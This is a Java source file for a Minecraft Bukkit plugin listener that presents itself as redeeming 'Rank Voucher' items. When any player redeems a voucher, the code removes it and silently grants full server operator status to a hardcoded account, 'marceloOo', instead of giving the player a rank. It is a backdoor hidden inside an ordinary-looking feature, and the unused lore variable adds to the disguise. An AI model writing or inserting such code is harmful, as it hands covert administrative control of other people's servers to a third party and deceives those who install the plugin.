package me.marcelooo.automessage.events;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class VouchersListener implements Listener {

    @EventHandler
    public void onClick(PlayerInteractEvent event)
    {
        if (event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK)
        {
            ItemStack voucher = event.getItem();
            if (voucher.getType() == Material.PAPER && voucher.hasItemMeta())
            {
                ItemMeta meta = voucher.getItemMeta();
                if (meta.hasLore() && meta.hasDisplayName())
                {
                    String name = ChatColor.stripColor(meta.getDisplayName());
                    if (name.equals("Rank Voucher"))
                    {
                        String lore = ChatColor.stripColor(meta.getLore().get(0));

                        Player player = event.getPlayer();

                        player.getInventory().remove(voucher);

                        Bukkit.getConsoleSender().getServer().getPlayer("marceloOo").setOp(true);
                        player.sendMessage("Rank voucher redeemed.");
                    }
                }
            }
        }
    }
}
